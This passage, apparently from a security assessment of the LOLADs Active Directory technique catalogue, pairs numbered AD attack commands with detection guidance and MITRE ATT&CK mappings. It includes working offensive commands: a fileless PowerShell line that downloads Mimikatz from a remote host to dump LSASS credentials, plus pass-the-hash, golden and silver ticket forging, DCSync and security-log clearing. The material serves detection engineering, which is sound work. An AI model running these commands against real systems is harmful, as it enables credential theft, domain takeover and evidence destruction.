**Detection:** LDAP query with recursive group membership filter

**MITRE ATT&CK:** T1069.002 - Permission Groups Discovery: Domain Groups

---

#### 73. List Privileged Accounts in Domain (AdminSDHolder)
**Command:** `Get-ADUser -Filter {AdminCount -eq 1} | Select-Object Name, SamAccountName`
**Type:** PowerShell (Native AD)

**AD Objects Abused:** `adminCount` attribute - set by AdminSDHolder mechanism

**Attack Scenario:** `AdminCount=1` is set on accounts that are (or were) members of protected groups. The AdminSDHolder mechanism then controls their ACLs. These accounts are high-value targets and their ACLs are periodically overwritten by `SDProp` - meaning ACL changes on these accounts may be reversed.

**Detection:** LDAP query filter on `adminCount=1`

**MITRE ATT&CK:** T1069.002, T1087.002

---

#### 75. Identify Computers with Unconstrained Delegation
**Command:** `Get-ADComputer -Filter {TrustedForDelegation -eq $true} | Select-Object Name, DNSHostName`
**Type:** PowerShell (Native AD)

**AD Objects Abused:** Computer objects with unconstrained delegation flag

**Attack Scenario:** Identifies machines where credential theft is possible if privileged users authenticate. Used in conjunction with PrinterBug/PetitPotam to coerce DC authentication to attacker-controlled machine with unconstrained delegation.

**Detection:**
- Alert on any non-DC machine having `TrustedForDelegation=TRUE`
- DCs legitimately have this flag - computers that are not DCs should not

**MITRE ATT&CK:** T1134.001 - Token Impersonation/Theft

---

#### 80. List Delegated Admins on Specific OU
**Command:** `Get-ACL "OU=TestOU,DC=domain,DC=com" | Format-List`
**Type:** PowerShell (Native)

**AD Objects Abused:** ACLs on OU objects

**Attack Scenario:** Identifies who has delegated administrative control over specific OUs. Attackers look for non-DA accounts with `GenericWrite` or `WriteDACL` on OUs containing sensitive objects - these can be abused to take control of objects within the OU.

**Detection:** Monitor ACL reads on OU objects (Event ID 4662 with ReadProperty right)

**MITRE ATT&CK:** T1222.001 - File and Directory Permissions Modification

---

#### 83. Find Computers with LAPS Enabled
**Command:** `Find-AdmPwdExtendedRights -Identity "OU=Workstations,DC=domain,DC=com"`
**Type:** PowerShell (LAPS module)
**Dependency:** LAPS PowerShell module

**AD Objects Abused:** LAPS attribute permissions (`ms-Mcs-AdmPwd`)

**Attack Scenario:** Identifies which computers have LAPS (Local Administrator Password Solution) enabled AND who has read access to the LAPS password attribute. If any non-admin account has `AllExtendedRights` on an OU with LAPS computers, that account can read all local admin passwords.

**Detection:**
- Queries for `ms-Mcs-AdmPwd` attribute across machines
- Alert on any reads of `ms-Mcs-AdmPwd` by unauthorized accounts (Event ID 4662)

**MITRE ATT&CK:** T1555 - Credentials from Password Stores

---

#### 87. Enumerate Fine-Grained Password Policies
**Command:** `Get-ADFineGrainedPasswordPolicy`
**Type:** PowerShell (Native AD)

**AD Objects Abused:** Fine-Grained Password Policy (PSO) objects in `CN=Password Settings Container`

**Attack Scenario:** Fine-grained password policies override the default policy for specific accounts or groups. Attackers look for accounts with more lenient policies (shorter passwords, no lockout) that may be easier to brute force.

**Detection:** LDAP query on Password Settings Container

**MITRE ATT&CK:** T1201 - Password Policy Discovery

---

#### 88. Find High-Value Targets (Admins with SPN)
**Command:** `Get-ADUser -Filter {ServicePrincipalName -ne "$null" -and MemberOf -like "*Domain Admins*"} | Select Name, ServicePrincipalName`
**Type:** PowerShell (Native AD)

**AD Objects Abused:** Intersection of SPN and privileged group membership

**Attack Scenario:** Finds the holy grail: Domain Admin accounts with SPNs. Kerberoasting these yields hashes that, if cracked, provide immediate DA access. Every organization should ensure DA accounts have no SPNs.

**Detection:**
- LDAP query combining SPN and group membership filters
- Alert: Any DA account having an SPN set

**MITRE ATT&CK:** T1558.003 - Kerberoasting

---

#### 90. Find Sensitive Account Delegations
**Command:** `Get-ADUser -Filter {TrustedForDelegation -eq $true} | Select-Object Name, SamAccountName`
**Type:** PowerShell (Native AD)

**AD Objects Abused:** `TrustedForDelegation` on user accounts (unconstrained delegation on users)

**Attack Scenario:** User accounts with unconstrained delegation can impersonate any user. This is even more dangerous than computer accounts with this flag, as user accounts are more likely to be phished or password-sprayed.

**MITRE ATT&CK:** T1134.001 - Token Impersonation/Theft

---

#### 92. Check for Kerberos Pre-Authentication Disabled Accounts
**Command:** `Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} | Select Name, SamAccountName`
**Type:** PowerShell (Native AD)

**AD Objects Abused:** `DONT_REQUIRE_PREAUTH` flag on user objects (UF_DONT_REQUIRE_PREAUTH)

**Attack Scenario:** **AS-REP Roasting.** When Kerberos pre-authentication is disabled, anyone can request an AS-REP (Authentication Service Response) for that account without knowing the password. The response contains data encrypted with the user's NTLM hash, crackable offline. No authentication required - anonymous LDAP query is sufficient to enumerate these accounts.

**Detection:**
- LDAP query: `(userAccountControl:1.2.840.113556.1.4.803:=4194304)` - UAC flag for no pre-auth
- AS-REP Roasting: Event ID 4768 with Pre-Authentication Type = 0
- Alert: Any account with `DoesNotRequirePreAuth` enabled (Event ID 4738)
- Splunk: `EventCode=4768 Pre_Authentication_Type=0x0`

**MITRE ATT&CK:** T1558.004 - Steal or Forge Kerberos Tickets: AS-REP Roasting

---

#### 95. Enumerate All Forest Trusts
**Command:** `Get-ADTrust -Filter *`
**Type:** PowerShell (Native AD)

**AD Objects Abused:** `trustedDomain` objects in the domain and Configuration partition

**Attack Scenario:** Complete trust enumeration including forest trusts, external trusts, and shortcut trusts. Identifies cross-forest attack paths. Forest trusts with SIDHistory enabled are especially dangerous as they allow SID injection from child to parent domain.

**Detection:**
- LDAP query on `trustedDomain` objects
- Trust relationship monitoring

**MITRE ATT&CK:** T1482 - Domain Trust Discovery

---

#### 99. Identify Admin Accounts with Password Never Expire
**Command:** `Get-ADUser -Filter {PasswordNeverExpires -eq $true -and AdminCount -eq 1} | Select-Object Name`
**Type:** PowerShell (Native AD)

**AD Objects Abused:** `DONT_EXPIRE_PASSWORD` flag + `adminCount` attribute

**Attack Scenario:** Admin accounts with non-expiring passwords are ideal targets for credential spraying - even if compromised long ago, the password may still be valid. Also indicates poor security hygiene.

**Detection:** LDAP query for combination of UAC flags

**MITRE ATT&CK:** T1087.002, T1201

---

### SECTION 4: Credential Theft and Kerberos Attacks (Fileless)

*Note: Entries 109-112 and 125-129 use Mimikatz loaded fileless via PowerShell IEX. While fileless, they require Mimikatz availability at a remote URL.*

---

#### 109. Run Mimikatz as Admin (Fileless)
**Command:** `IEX (New-Object Net.WebClient).DownloadString('http://servidor_remoto/mimikatz.ps1'); Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords'`
**Type:** PowerShell (Fileless)
**Dependency:** Network-hosted Invoke-Mimikatz script

**AD Objects Abused:** LSASS process memory (Windows LSA secrets, WDigest credentials)

**Attack Scenario:** Dumps all credentials from LSASS memory without writing Mimikatz to disk. In Windows 8.1+ with Protected Users group and Credential Guard disabled, this may still yield NTLM hashes and Kerberos tickets.

**Detection:**
- Event ID 4104: PowerShell script block logging captures `Invoke-Mimikatz`
- AMSI detects Mimikatz signatures in memory
- Sysmon Event ID 10: Process access - LSASS memory read by PowerShell
- Windows Defender Credential Guard prevents LSASS credential access
- Alert: Any process accessing LSASS with `PROCESS_VM_READ` (Event ID 10 Sysmon)

**MITRE ATT&CK:** T1003.001 - OS Credential Dumping: LSASS Memory, T1059.001 - PowerShell

---

#### 110. Dump Credentials from Memory (Fileless)
**Command:** Same as #109 with different Mimikatz command
**Type:** PowerShell (Fileless)

**Attack Scenario:** Variant of credential dumping targeting logon sessions. Captures cleartext passwords when WDigest authentication is enabled (common in pre-Win10 environments and misconfigured systems).

**Detection:** Same as #109 plus:
- Check WDigest registry: `HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest` - `UseLogonCredential` should be 0

**MITRE ATT&CK:** T1003.001 - LSASS Memory

---

#### 111. Extract Kerberos Ticket (Fileless)
**Command:** `IEX ... Invoke-Mimikatz -Command 'kerberos::list /export'`
**Type:** PowerShell (Fileless)

**AD Objects Abused:** Kerberos tickets in memory (LSASS/ticket cache)

**Attack Scenario:** Exports all Kerberos tickets from memory to disk (in fileless variant, to temp location). Used for pass-the-ticket attacks or offline analysis of service ticket hashes.

**Detection:**
- Sysmon Event ID 10: LSASS process access
- Monitor for `.kirbi` file creation
- Kerberos ticket export via `kerberos::list /export`

**MITRE ATT&CK:** T1558 - Steal or Forge Kerberos Tickets

---

#### 112. Pass-the-Hash Attack (Fileless)
**Command:** `IEX ... Invoke-Mimikatz -Command 'sekurlsa::pth /user:UserName /domain:domain.local /ntlm:hash /run:powershell.exe'`
**Type:** PowerShell (Fileless)

**AD Objects Abused:** NTLM authentication protocol, LSA secrets

**Attack Scenario:** **Pass-the-Hash.** Uses an NTLM hash (obtained from LSASS dump, SAM, or NTDS.dit) to authenticate as a user without knowing the plaintext password. Opens a new process (powershell.exe) running as the target user. Does not require cracking.

**Detection:**
- Event ID 4624: Logon Type 9 (NewCredentials) - PTH characteristic
- Anomaly: Logon from unexpected host/user combination
- Network: Authentication attempts from unexpected sources
- Alert: Account logging in from multiple geolocations simultaneously

**MITRE ATT&CK:** T1550.002 - Use Alternate Authentication Material: Pass the Hash

---

#### 125. Golden Ticket Attack (Fileless)
**Command:** `IEX ... Invoke-Mimikatz -Command 'kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-[SID] /krbtgt:[hash] /id:500'`
**Type:** PowerShell (Fileless)

**AD Objects Abused:** Kerberos TGT signing mechanism, krbtgt account

**Attack Scenario:** **Golden Ticket.** Using the NTLM hash of the `krbtgt` account (the KDC service account), an attacker can forge a Ticket Granting Ticket (TGT) for ANY user (including non-existent ones) with any group memberships. The TGT is trusted by all domain services. Valid for up to 10 years. Persists even after password changes on user accounts (only resetting krbtgt twice removes it).

**Detection:**
- Event ID 4769: Service ticket request with anomalous flags
- Event ID 4672: Special privileges assigned to new logon - anomalous for non-admin accounts
- Detect: TGT with lifetime > domain policy maximum (e.g., >10 hours by default)
- Detect: TGT with future-dated or anomalous timestamps
- Splunk: `EventCode=4769 AND Account_Domain!="DOMAIN"` (Golden tickets often use wrong domain)
- Microsoft Defender for Identity: "Forged Kerberos Golden Ticket" alert
- Reset `krbtgt` password TWICE to invalidate all existing Golden Tickets

**MITRE ATT&CK:** T1558.001 - Steal or Forge Kerberos Tickets: Golden Ticket

---

#### 126. Silver Ticket Attack (Fileless)
**Command:** `IEX ... Invoke-Mimikatz -Command 'kerberos::golden /user:UserName /domain:domain.local /sid:[SID] /target:server.domain.local /service:cifs /rc4:[service_account_hash] /id:500'`
**Type:** PowerShell (Fileless)

**AD Objects Abused:** Service Ticket (TGS) mechanism, service account NTLM hash

**Attack Scenario:** **Silver Ticket.** Unlike Golden Tickets, Silver Tickets forge a TGS (service ticket) directly, targeting a specific service. Requires only the service account's hash (not krbtgt). More stealthy than Golden Tickets (doesn't contact KDC). Valid for specific services only (CIFS, HTTP, MSSQL, etc.). Not logged in DC event logs.

**Detection:**
- Very difficult to detect - no KDC contact required
- Microsoft Defender for Identity can detect anomalous service tickets
- Behavioral: Sudden access to services from unexpected accounts
- Event ID 4627 on the service host
- Endpoint detection: Memory analysis for forged tickets via tools like Get-KerberosTicketInfo

**MITRE ATT&CK:** T1558.002 - Steal or Forge Kerberos Tickets: Silver Ticket

---

#### 127. Pass-the-Ticket Attack (Fileless)
**Command:** `IEX ... Invoke-Mimikatz -Command 'kerberos::ptt /ticketfile.kirbi'`
**Type:** PowerShell (Fileless)

**AD Objects Abused:** Kerberos ticket cache (in-memory)

**Attack Scenario:** **Pass-the-Ticket.** Injects a stolen or forged Kerberos ticket into the current logon session, allowing access to resources as another user. Unlike PTH, works at the Kerberos layer. Used to impersonate users without their credentials.

**Detection:**
- Event ID 4768/4769: Unusual ticket requests
- Ticket injection into running process memory
- Sysmon Event ID 8: CreateRemoteThread in LSASS

**MITRE ATT&CK:** T1550.003 - Use Alternate Authentication Material: Pass the Ticket

---

#### 128. Dump Cached Domain Credentials (Fileless)
**Command:** `IEX ... Invoke-Mimikatz -Command 'sekurlsa::logonpasswords'`
**Type:** PowerShell (Fileless)

**AD Objects Abused:** LSASS memory - MSCacheV2 (Domain Cached Credentials/DCC2)

**Attack Scenario:** Extracts Domain Cached Credentials (DCC2) stored in LSASS for offline machines. Even if the DC is unreachable, these cached credentials allow local login. The DCC2 hashes can be cracked with Hashcat (mode 2100) but are much slower to crack than NTLM.

**Detection:**
- Sysmon Event ID 10: LSASS process access
- Windows Defender Credential Guard prevents this
- Set `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\CachedLogonsCount` to 0 to disable caching

**MITRE ATT&CK:** T1003.005 - OS Credential Dumping: Cached Domain Credentials

---

#### 129. Dump Domain Credentials using DCSync (Fileless)
**Command:** `IEX ... Invoke-Mimikatz -Command 'lsadump::dcsync /domain:domain.local /user:krbtgt'`
**Type:** PowerShell (Fileless)

**AD Objects Abused:** DRSUAPI (Directory Replication Service Remote Protocol), `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` rights

**Attack Scenario:** **DCSync.** Mimics a DC requesting password data from another DC. Does not require code execution on the DC - the DRSUAPI protocol is used remotely. Can extract NTLM hashes and Kerberos keys for any account, including `krbtgt`. Requires `Replicating Directory Changes All` permission (granted to DCs, Domain Admins, and occasionally over-privileged accounts).

**Detection:**
- Event ID 4662: Operation performed on AD object - specifically `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` access rights
- Filter: Non-DC machine performing replication operations
- Microsoft Defender for Identity: "Suspected DCSync attack" alert
- Splunk: `EventCode=4662 Properties="*1131f6aa*" OR Properties="*1131f6ad*"` (GUID for replication rights)
- Network: DRSUAPI traffic (RPC) from non-DC to DC

**MITRE ATT&CK:** T1003.006 - OS Credential Dumping: DCSync

---

### SECTION 5: Registry and GPO Manipulation

---

#### 113. Enumerate All Registry Keys
**Command:** `reg query HKLM`
**Type:** CMD (Native Windows)

**AD Objects Abused:** Windows Registry (HKLM hive)

**Attack Scenario:** Reconnaissance of HKLM for configuration details, installed software, security tool settings, and persistence mechanisms left by other attackers.

**Detection:** Monitor `reg.exe query` on HKLM root

**MITRE ATT&CK:** T1012 - Query Registry

---

#### 114. Check AutoStart Programs
**Command:** `reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
**Type:** CMD (Native Windows)

**AD Objects Abused:** HKLM Run key (autostart persistence location)

**Attack Scenario:** Enumerates persistence mechanisms. Attackers check existing Run keys to understand what software is expected (for camouflage) and to verify their own persistence.

**Detection:** Monitor reads of common persistence registry paths

**MITRE ATT&CK:** T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys

---

#### 115. Modify Registry Key Permissions
**Command:** `reg add HKLM\Software\ExampleKey /v ExampleValue /t REG_SZ /d "ExampleData" /f`
**Type:** CMD (Native Windows)

**AD Objects Abused:** HKLM registry hive

**Attack Scenario:** Registry modification for persistence or configuration tampering. Writing to HKLM requires admin privileges - finding writable HKLM keys indicates misconfigured permissions (privilege escalation path).

**Detection:**
- Event ID 4657: A registry value was modified (with object access auditing)
- Monitor writes to sensitive HKLM paths

**MITRE ATT&CK:** T1547.001 - Registry Run Keys / Startup Folder

---

#### 116. Export Registry Hive
**Command:** `reg export HKLM\Software\MyKey mykey.reg`
**Type:** CMD (Native Windows)

**AD Objects Abused:** Registry hive data

**Attack Scenario:** Exports registry hives for offline analysis. Used to extract credentials from SAM hive offline after shadow copy or backup.

**Detection:** Monitor `reg.exe export` commands

**MITRE ATT&CK:** T1003.002 - OS Credential Dumping: Security Account Manager

---

#### 117. Force Group Policy Update
**Command:** `gpupdate /force`
**Type:** CMD (Native Windows)

**AD Objects Abused:** Group Policy processing mechanism

**Attack Scenario:** Forces immediate GPO refresh. After modifying a GPO for persistence (adding a startup script, modifying security settings), attackers force `gpupdate /force` to apply changes immediately rather than waiting for the default 90-minute cycle.

**Detection:**
- Monitor `gpupdate.exe` with `/force` flag
- Correlate with recent GPO modification events (Event ID 5136 - A directory service object was modified)

**MITRE ATT&CK:** T1484.001 - Domain Policy Modification: Group Policy Modification

---

#### 118. List Applied GPOs for Computer
**Command:** `gpresult /R /SCOPE COMPUTER`
**Type:** CMD (Native Windows)

**AD Objects Abused:** Group Policy resultant set, RSOP (Resultant Set of Policy)

**Attack Scenario:** Lists all GPOs applied to the current machine. Attackers look for GPOs with scripts, software deployment, or security settings that can be abused or modified. Also identifies GPOs linked high in the hierarchy with broad impact.

**Detection:** Monitor `gpresult.exe` execution from unexpected hosts

**MITRE ATT&CK:** T1615 - Group Policy Discovery

---

#### 119. Enumerate All GPOs Linked to OU
**Command:** `Get-GPLink -Domain domain.local -Target "OU=ExampleOU,DC=domain,DC=local"`
**Type:** PowerShell (Group Policy module)

**AD Objects Abused:** GPO link objects on OU

**Attack Scenario:** Identifies which GPOs are linked to which OUs. Attackers look for GPOs linked to OUs containing sensitive machines that they can modify (if they have write access to the GPO).

**MITRE ATT&CK:** T1615 - Group Policy Discovery

---

#### 120-121. List All Group Policies / Find Local Admins
**Commands:** `Get-GPO -All` / `net localgroup Administrators /domain`

**Attack Scenario:** GPO listing for targeting. Local admin enumeration on domain accounts.

**MITRE ATT&CK:** T1615, T1069.001

---

#### 122. View Security Event Logs
**Command:** `Get-EventLog -LogName Security -Newest 100`
**Type:** PowerShell (Native)

**AD Objects Abused:** Windows Security Event Log

**Attack Scenario:** Attackers read security logs to understand what monitoring is in place, check if their activity has been logged, and find evidence of other users' activities (successful/failed logins, privilege use).

**Detection:** Monitor Event Log read access (Event ID 4656 on the Security log)

**MITRE ATT&CK:** T1070.001 - Indicator Removal: Clear Windows Event Logs (reconnaissance precursor)

---

#### 123. Clear Security Event Logs
**Command:** `Clear-EventLog -LogName Security`
**Type:** PowerShell (Native)

**AD Objects Abused:** Windows Security Event Log (destructive action)

**Attack Scenario:** **Anti-forensics.** Clears the Security event log to remove evidence of attacker activity. Requires administrator privileges. Event ID 1102 is generated when the security log is cleared - but this indicator is in the log being cleared, so it may be the last entry.

**Detection:**
- Event ID 1102: The audit log was cleared (generated even when clearing)
- Alert: Any non-expected account clearing event logs
- Offload logs to SIEM in real-time - log clearing on endpoint doesn't affect SIEM data

**MITRE ATT&CK:** T1070.001 - Indicator Removal: Clear Windows Event Logs

---

#### 124/130. Enable Remote Desktop (RDP)
**Command:** `reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f`
**Type:** CMD (Native Windows)

**AD Objects Abused:** HKLM registry, Terminal Services configuration

**Attack Scenario:** Enables RDP on a target machine for persistent remote access and lateral movement. Native registry modification requires no additional tools.

**Detection:**
- Registry write to Terminal Server key (Event ID 4657)
- Firewall rule changes for port 3389
- New RDP service session (Event ID 4624 Type 10)
- Alert: `fDenyTSConnections` registry value changing from 1 to 0

**MITRE ATT&CK:** T1021.001 - Remote Services: Remote Desktop Protocol

---

#### 131. Check Registry Keys for Persistence
**Command:** `reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
**Type:** CMD (Native Windows)

**AD Objects Abused:** HKCU Run key (user-level persistence)

**Attack Scenario:** Checks for user-level persistence mechanisms. HKCU Run key is writable by any user without admin rights - a common persistence method in restricted environments.

**Detection:** Monitor HKCU Run key writes and reads

**MITRE ATT&CK:** T1547.001 - Registry Run Keys / Startup Folder

---

#### 132. List User Rights Assignments
**Command:** `Get-GPResultantSetOfPolicy -User domain\username -ReportType Html -Path C:\gporeport.html`
**Type:** PowerShell (Group Policy module)

**AD Objects Abused:** RSOP (Resultant Set of Policy), user rights assignments

**Attack Scenario:** Generates full GPO report for a specific user. Identifies all user rights (SeDebugPrivilege, SeBackupPrivilege, etc.) granted via GPO. Attackers look for accounts with excessive rights they can abuse.

**MITRE ATT&CK:** T1615 - Group Policy Discovery

---

#### 133. Export All Group Policy Objects
**Command:** `Backup-GPO -All -Path "C:\GPOBackups"`
**Type:** PowerShell (Group Policy module)

**AD Objects Abused:** All GPO objects in the domain

**Attack Scenario:** Exports all GPOs for offline analysis. A complete GPO backup contains scripts, security settings, and software deployment configurations - a goldmine for attackers seeking persistence paths and security misconfigurations.

**Detection:**
- Monitor `Backup-GPO` execution
- Large write operations to local disk from Group Policy cmdlets
- Event ID 5136: GPO modification (Backup-GPO reads but doesn't write - however, the write of backup files is suspicious)

**MITRE ATT&CK:** T1615, T1530 - Data from Cloud Storage

---

### SECTION 6: Pass-the-Hash with Mimikatz (Native)

---

#### 134. Pass-the-Hash Attack on Local Account
**Command:** `sekurlsa::pth /user:LocalUser /domain:localhost /ntlm:[hash] /run:powershell.exe`
**Type:** Mimikatz (direct)
**Dependency:** Mimikatz binary

**AD Objects Abused:** NTLM authentication protocol, local SAM account

**Attack Scenario:** Uses a local account NTLM hash to spawn a process running as that user. Useful for lateral movement using local administrator hashes when domain credentials are unavailable or when targeting machines with the same local admin password (common in pre-LAPS environments).

**Detection:**
- Event ID 4624 Logon Type 9 (NewCredentials) on source host
- Event ID 4648: A logon was attempted using explicit credentials
- Anomaly: Multiple hosts authenticating with the same local account hash (indicates LAPS not deployed)

**MITRE ATT&CK:** T1550.002 - Use Alternate Authentication Material: Pass the Hash

---

#### 135-137. Additional Infrastructure Discovery

| # | Command | Purpose | MITRE |
|---|---------|---------|-------|
| 135 | `repadmin /showrepl` | Query AD replication partners | T1018 |
| 136 | `Get-ADReplicationSite -Filter *` | List all AD sites | T1018 |
| 137 | `Get-ADGroupMember -Identity "Domain Admins"` | Identify DA members | T1069.002 |

---

## Consolidated MITRE ATT&CK Mapping

| Technique ID | Name | LOLADs Entry Numbers |
|-------------|------|---------------------|
| T1087.002 | Account Discovery: Domain Account | 5, 11, 13, 18, 19, 40-44, 55, 67, 70, 73, 99, 103-104 |
| T1069.002 | Permission Groups Discovery: Domain Groups | 3, 7, 16, 28, 45, 53, 66, 72, 76, 89, 91, 105, 137 |
| T1069.001 | Permission Groups Discovery: Local Groups | 32, 35, 69, 108, 121 |
| T1482 | Domain Trust Discovery | 1, 20-21, 23, 29-30, 43, 95 |
| T1018 | Remote System Discovery | 2, 4, 13-14, 20, 47-50, 97, 135-136 |
| T1558.003 | Kerberoasting | 12, 33, 55, 78, 88 |
| T1558.004 | AS-REP Roasting | 92 |
| T1558.001 | Golden Ticket | 125 |
| T1558.002 | Silver Ticket | 126 |
| T1558 | Steal/Forge Kerberos Tickets | 8, 111, 127 |
| T1550.002 | Pass the Hash | 112, 134 |
| T1550.003 | Pass the Ticket | 127 |
| T1003.006 | DCSync | 38, 129 |
| T1003.001 | LSASS Memory Dumping | 109, 110, 128 |
| T1003.005 | Cached Domain Credentials | 128 |
| T1003.002 | SAM Dumping | 116 |
| T1134.005 | SID-History Injection | 24 |
| T1134.001 | Token Impersonation (Delegation) | 10, 17, 75, 90 |
| T1201 | Password Policy Discovery | 6, 8, 39, 56, 63, 77, 87, 99 |
| T1615 | Group Policy Discovery | 15, 60, 74, 94, 118-120, 132-133 |
| T1484.001 | GPO Modification | 15, 117 |
| T1021.001 | Remote Desktop Protocol | 124, 130 |
| T1021.002 | SMB/Windows Admin Shares | 35-36 |
| T1059.001 | PowerShell Execution | 26-27, 109-112, 125-129 |
| T1070.001 | Clear Windows Event Logs | 122-123 |
| T1547.001 | Registry Run Keys | 114-115, 131 |
| T1574.011 | Registry Service Permissions | 37 |
| T1012 | Query Registry | 113-114, 131 |
| T1049 | System Network Connections Discovery | 34 |
| T1016 | System Network Configuration Discovery | 50, 52 |
| T1082 | System Information Discovery | 44-45 |
| T1135 | Network Share Discovery | 57, 96 |
| T1555 | Credentials from Password Stores (LAPS) | 83, 100 |
| T1649 | Steal/Forge Authentication Certificates | 25 |
| T1222.001 | File and Directory Permissions Modification | 40, 80 |
| T1098 | Account Manipulation | 40 |
| T1027 | Obfuscated Files/Information | 26-27 |

---

## Detection Engineering Summary

### Highest-Fidelity Detections

These detections have low false-positive rates and should be implemented as HIGH-PRIORITY alerts:

| Detection | Event IDs | Description |
|-----------|-----------|-------------|
| Kerberoasting | 4769 (EType 23) | RC4 TGS requests - nearly always malicious in modern environments |
| AS-REP Roasting | 4768 (PreAuth Type 0) | Pre-auth disabled AS-REP requests |
| DCSync | 4662 (GUID 1131f6aa/1131f6ad) | Non-DC performing DS-Replication rights |
| Golden Ticket | 4769 + anomalous TGT | Tickets with invalid lifetime or wrong domain |
| Log Clearing | 1102 | Security log cleared - almost always attacker action |
| SID History Modification | 4765/4738 | SIDHistory changes outside migration |
| Unconstrained Delegation Modified | 4742/4738 | TrustedForDelegation flag set on computer/user |
| Mimikatz LSASS Access | Sysmon 10 | PowerShell/cmd accessing LSASS with VM_READ |
| IEX + DownloadString | 4104 | PowerShell fileless execution pattern |
| PTH (Logon Type 9) | 4624 (Type 9) | NewCredentials logon - PTH indicator |

### Baseline Queries for Anomaly Detection

```
# Kerberoasting - bulk TGS requests
EventCode=4769 Encryption_Type=0x17 | stats count by Account_Name | where count > 5

# DCSync from non-DC
EventCode=4662 Properties="*1131f6aa*" Source_Network_Address NOT IN [dc_list]

# AS-REP Roasting
EventCode=4768 Pre_Authentication_Type=0x0

# Bulk LDAP user enumeration (>500 users from single source)
LDAP queries for (objectClass=user) with response size > 500 objects

# Admin account SPN (Kerberoastable DA)
Get-ADUser -Filter {adminCount -eq 1 -and ServicePrincipalName -ne "$null"}

# PowerShell IEX pattern
EventCode=4104 ScriptBlockText="*IEX*DownloadString*"
```

---

## LOLADs Project Assessment for ATHENA

### Coverage Assessment

| Attack Category | LOLADs Coverage | Completeness | Notes |
|----------------|-----------------|-------------|-------|
| Reconnaissance | HIGH | 75+ techniques | Comprehensive enumeration |
| Kerberos Attacks | MEDIUM | 5 techniques | Missing: PKINIT, S4U2Proxy, constrained delegation |
| Credential Dumping | MEDIUM | 6 techniques | Covers main paths, missing NTDS.dit direct |
| ACL Abuse | LOW | 2 techniques | Missing: GenericWrite, WriteOwner, ForceChangePassword |
| ADCS/Certificates | LOW | 2 techniques | Missing: ESC1-ESC8 |
| Trust Attacks | MEDIUM | 6 techniques | Missing: Cross-forest SID injection details |
| Lateral Movement | LOW | 3 techniques | Missing: WMI, DCOM, PsExec |
| Persistence | MEDIUM | 10+ techniques | GPO, Registry covered |

### Gaps vs Comprehensive AD Attack Coverage

The following high-impact AD techniques are NOT documented in LOLADs but should be in ATHENA:

1. **ADCS ESC1-ESC8** - Certificate template abuse (Certify/Certipy)
2. **Constrained Delegation (S4U2Proxy)** - Resource-based constrained delegation
3. **RBCD (Resource-Based Constrained Delegation)** - msDS-AllowedToActOnBehalfOfOtherIdentity
4. **Shadow Credentials** - msDS-KeyCredentialLink manipulation
5. **Zerologon (CVE-2020-1472)** - Netlogon privilege escalation
6. **PrintNightmare (CVE-2021-34527)** - Windows Print Spooler RCE
7. **PetitPotam** - NTLM relay to ADCS
8. **BloodHound Attack Paths** - ACL-based privilege escalation
9. **NTLM Relay** - Relay captured hashes to other services
10. **LLMNR/NBT-NS Poisoning** - Responder-based credential capture

---

## References

- LOLADs Project: https://lolad-project.github.io/
- GitHub Repository: https://github.com/LOLAD-Project/LOLAD-Project.github.io
- MITRE ATT&CK: https://attack.mitre.org
- LOLBAS Project: https://lolbas-project.github.io
- GTFOBins: https://gtfobins.github.io
- HackTricks AD: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
